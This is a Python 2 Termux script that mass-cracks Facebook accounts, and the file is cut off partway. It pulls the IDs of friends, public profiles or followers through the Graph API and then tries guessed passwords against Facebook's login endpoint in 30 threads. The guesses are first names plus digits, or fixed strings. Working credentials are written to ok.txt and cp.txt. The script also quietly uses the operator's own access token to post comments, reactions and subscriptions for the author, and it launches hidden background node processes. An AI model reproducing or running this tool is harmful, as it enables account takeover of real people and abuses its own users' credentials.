# coding=utf-8
#!/usr/bin/python
# coding=utf-8


try:
    import os,re,sys,itertools,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,uuid,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pkg install python -y")
    os.system("pip install requests")
    os.system("pip install mechanize")
    os.system("pip2 install nodejs")
    os.system("pip2 install npm")
    os.system("python2 ab.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ... .....')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
__author__ = 'Fariya Khan'
__copyright = 'All rights reserved . Copyright  Fariya Khan'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")
os.system('git pull')
os.system('clear')

logo = """
\033[1;97m    _________    ____  ____
\033[1;96m   / ____/   |  / __ \/  _/
\033[1;97m  / /_  / /| | / /_/ // /  
\033[1;96m / __/ / ___ |/ _, _// /     \033[1;91m║ Version: 3.0
\033[1;97m/_/   /_/  |_/_/ |_/___/   
\033[1;97m--------------------------------------------------
\033[1;97mAuthor     : Fariya Khan Official.
\033[1;97mFacebook   : m.facebook.com/Faritricker007
\033[1;97mPage       : m.facebook.com/TechFari007
\033[1;97m--------------------------------------------------
"""

def reg():
    os.system('clear')
    print logo
    print '\t\033[1;97m Enjoy Free Cloning'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.fariya.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Faritricker/Server/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\t\033[1;91mApproved Failed'
        print ' '
        print ' \x1b[1;97mYour Id Is Not Approved Already '
        print ' \x1b[1;97mCopy The Id And Send To Admin'
        print ' \033[1;97mYour id:\033[1;92m ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/Faritricker007')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\t\033[1;97mApproval Not Detected'
    print ' '
    print ' \x1b[1;92mCopy And Press Enter , Then Select Facebook To Continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press Enter To Go To Facebook ')
    os.system('xdg-open https://www.facebook.com/Faritricker007')
    sav = open('/sdcard/.fariya.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press Enter To Check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\t\033[0;97mCollecting Device Info'
    print("")
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \x1b[1;92mYour network: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    loginvia()
    
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[!] Logging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[!] Tool Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[!] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[!] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def keluar():
    print '\x1b[0;91m•\x1b[0;93m EXIIT :)\x1b[0;97m'
    os.sys.exit()
		

idh = []
	
def loginvia():
    os.system('clear')
    print logo
    print("\033[0;97m [1] Login Via Access-Token")
    print("\033[0;97m [2] Login Via User And Pass")
    print("\033[0;97m [3] Get Access-Token")
    print("\033[0;97m [4] Tech Fari Youtube Channel")
    print("\033[0;97m [0] Back")
    print ' '
    clone_loginvia()
def clone_loginvia():
    fari = raw_input("\n [!] Choose : ")
    if fari =="1":
        logintok()
    elif fari =="2":
        loginfb()
    elif fari =="3":
        gettoken()
    elif fari =="4":
        yt()
    elif fari =="0":
	        menu()
    else:
	        print ("[!] Please Select a Valid Option")
		clone_loginvia()
		
###GETTOKEN##
def gettoken():
    print logo
    print("\033[0;96m──────────────────────────────────────────────────")
    jalan("\033[1;96m[•] Open Youtube...")
    os.system("xdg-open https://youtu.be/LwUYU5RpvbYk")
    raw_input("\033[1;97m [BACK]")
    loginvia() 
    
###YOUTUBECHANNEL###
def yt():
    print logo
    print("\033[0;96m──────────────────────────────────────────────────")
    jalan("\033[1;96m[•] Open Youtube...")
    os.system("xdg-open https://www.youtube.com/channel/UCgzG74c3dNuzBP7hwjWWYYA")
    raw_input("\033[1;97m [BACK]")
    loginvia()
    

###LOGINTOKEN###
def logintok():
	os.system('clear')
	print logo
        print ("\033[1;93mLogin With Token").center(50)
	print("")
        token = raw_input("\033[1;97m[+]\033[1;97m Paste :\033[1;97m ")
	print("")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        jalan("\r\033[1;92m[✓] Login Successfull\033[0;97m")
        print ' '
        jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Please Subscribe My Youtube Channel :)")
        os.system('xdg-open https://www.youtube.com/channel/UCgzG74c3dNuzBP7hwjWWYYA')
        bot()
        
###BOT###
def bot():
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print"\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Token invalid"
        logintok()
    
    kom = ('Your Commands Is Best♥')
    kom1 = ('Big Fan Fariya Khan♥')
    reac = ('LOVE')
    post = ('1045071602597556')
    requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom1+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100012841782153/subscribers?access_token=' + token) #Fariya Khan
    requests.post('https://graph.facebook.com/100004586354930/subscribers?access_token=' + token) #Hunaen ALy
    menu()

###FBLOGIN###
def loginfb():
    os.system('clear')
    print logo
    print("\033[1;93mLogin With Facebook Account\033[1;0m").center(50)
    print("\033[1;93mUse Proxy to login account \033[1;0m").center(50)
    print("")
    id = raw_input("\033[1;97m[+]\033[1;93m Enter Your ID :\033[1;97m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("\033[1;97m[+]\033[1;93m Enter Your Password :\033[1;97m ")
    print("")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\n\033[1;92m[✓] Login Successfull\033[0;97m").center(50)
        jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Please Subscribe My Youtube Channel :)")
        os.system('xdg-open https://www.youtube.com/channel/UCgzG74c3dNuzBP7hwjWWYYA')
        bot()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
            time.sleep(1)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(1)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        loginvia()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("\033[1;91m[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        loginvia()
    os.system('clear')
    print logo
    print("\t  \033[1;92m[+] Logged User : "+name)
    print ' '
    print("\033[0;96m──────────────────────────────────────────────────")
    print("\033[0;97m[1] Clone From Auto Pass")
    print("\033[0;97m[2] Clone From Manual Pass")
    print("\033[0;97m[3] Make File")
    print("\033[0;97m[4] Subscribe Tech Fari Youtube Channel")
    print("\033[0;97m[0] Logout")
    print("\033[0;96m──────────────────────────────────────────────────")
    menu_select()
def menu_select():
    option = raw_input("\n\033[0;97m╰─➣ ")
    if option =="1":
        crack()
    if option =="4":
        yt()
    if option =="2":
        choose()
    if option =="3":
        extracting()
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\033[1;92m[✓] Logged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		
def crack():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		loginvia()
	os.system("clear")
	print logo
	print("\t   \033[1;91mCRACK FROM AUTO PASS")
	print ' '
	print(" \033[0;97m[1] Crack From FriendList")
	print(" \033[0;97m[2] Crack From Public")
	print(" \033[0;97m[3] Crack From Followers")
	print(" \033[0;97m[0] Back")
	print("")
	crack2()
def crack2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		print("\t\033[1;91m  CRACK FROM AUTO FRIENDLIST\033[1;0m")
		print("")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		print("\t\033[1;91m  CRACK FROM AUTO PUBLIC\033[1;0m")
		print("")
		idt = raw_input("\033[1;97m[!]\033[1;97m Put ID :\033[1;93m ")
		print("")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\t\033[1;91m  CRACK FROM AUTO PUBLIC\033[1;0m")
			print("")
			print("[✓] Public ID : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		print("\t\033[1;91m  CRACK FROM AUTO FOLLOWERS\033[1;0m")
		print("")
		idt = raw_input("\033[1;97m[+]\033[1;97m Put ID :\033[1;93m ")
		print("")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\t\033[1;91m  CRACK FROM AUTO FOLLOWERS\033[1;0m")
			print("")
			print("[✓] Follower ID : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
			   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		crack2()
	print("\033[1;97m[+]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	print("\033[1;97m[+]\033[1;97m Plz wait clone account will be appear here\033[1;0m")
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass1+"\x1b[1;91m | \x1b[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass1+" | "+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass2+"\x1b[1;91m | \x1b[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass2+" | "+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass3+"\x1b[1;91m | \x1b[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass3+" | "+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass4+"\x1b[1;91m | \x1b[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass4+" | "+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="786786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass5+"\x1b[1;91m | \x1b[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass5+" | "+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="000786"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass6+"\x1b[1;91m | \x1b[1;97m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass6+" | "+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="pakistan"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass7+"\x1b[1;91m | \x1b[1;97m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass7+" | "+name)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                        
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[+]\033[1;97m Process Has Been Completed')
	print('\033[1;97m[+]\033[1;97m Total CP/OK:\033[0;97m  '+str(len(cps))+'/\033[1;97m '+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	raw_input("\033[0;91mPress Enter To Main Menu Back")
	menu()

###CHOICEPASSMENU###
def choose():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		loginvia()
	os.system("clear")
	print logo
	print("\t   \033[1;91mCRACK FROM MANUAL PASS")
	print("")
	print(" \033[0;97m[1] Crack From Public")
	print(" \033[0;97m[2] Crack From Followers")
	print(" \033[0;97m[0] Back")
	print("")
	choose2()
def choose2():
	select = raw_input("\n╰─➣ ")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		print("\t\033[1;91m  CRACK FROM MANAUL PUBLIC\033[1;0m")
		print("")
		idt = raw_input("\033[1;97m[!]\033[1;97m Put ID :\033[1;93m ")
		print("")
		print("\033[1;97m--------------------------------------------------")
		print '\t\x1b[1;93mOnly Type Digit Like 1122,786,1234\x1b[1;91m'
		print("\033[1;97m--------------------------------------------------")
		print("")
		p1 = raw_input(' \x1b[1;97m[1]Name + digit: ')
		p2 = raw_input(' \x1b[1;97m[2]Name + digit: ')
		p3 = raw_input(' \x1b[1;97m[3]Name + digit: ')
		p4 = raw_input(' \x1b[1;97m[4]Name + digit: ')
		pass5 = raw_input(' \x1b[1;97m[5]Password: ')
		pass6 = raw_input(' \x1b[1;97m[6]Password: ')
		pass7 = raw_input(' \x1b[1;97m[7]Password: ')
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\t\033[1;91m  CRACK FROM MANAUL PUBLIC\033[1;0m")
			print("")
			print("[✓] Public ID : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			choose()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		print("\t\033[1;91m  CRACK FROM MANAUL FOLLOWERS\033[1;0m")
		print("")
		idt = raw_input("\033[1;97m[!]\033[1;97m Put ID :\033[1;93m ")
		print("")
		print("\033[1;97m--------------------------------------------------")
		print '\t\x1b[1;93mOnly Type Digit Like 1122,786,1234\x1b[1;91m'
		print("\033[1;97m--------------------------------------------------")
		p1 = raw_input('\x1b[1;97m[1]Name + digit: ')
		p2 = raw_input('\x1b[1;97m[2]Name + digit: ')
		p3 = raw_input('\x1b[1;97m[3]Name + digit: ')
		p4 = raw_input('\x1b[1;97m[4]Name + digit: ')
		pass5 = raw_input('\x1b[1;97m[5]Password: ')
		pass6 = raw_input('\x1b[1;97m[6]Password: ')
		pass7 = raw_input('\x1b[1;97m[7]Password: ')
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\t\033[1;91m  CRACK FROM MANAUL FOLLOWERS\033[1;0m")
			print("")
			print("[✓] FOLLOWER ID : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			choose()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		choose2()
	print("\033[1;97m[+]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	print("\033[1;97m[+]\033[1;97m Plz wait clone account will be appear here\033[1;0m")
	print("\033[1;97m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1 = name.lower() + p1
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass1+"\x1b[1;91m | \x1b[1;97m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92m[Successfull] "+uid+" | "+pass1+" | "+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2 = name.lower() + p2
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass2+"\x1b[1;91m | \x1b[1;97m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92m[Successfull] "+uid+" | "+pass2+" | "+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3 = name.lower() + p3
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass3+"\x1b[1;91m | \x1b[1;97m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\x1b[1;92m[Successfull] "+uid+" | "+pass3+" | "+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4 = name.lower() + p4
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass4+"\x1b[1;91m | \x1b[1;97m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[Successfull] "+uid+" | "+pass4+" | "+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;97m[\x1b[1;91mFK-CP\x1b[1;97m]\x1b[1;97m "+uid+"\x1b[1;91m | \x1b[1;97m"+pass5+"\x1b[1;91m | \x1b[1;97m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[Successfull] "+uid+" | "+pass5+" | "+name)
		                                            ok=open("ok.txt","a")
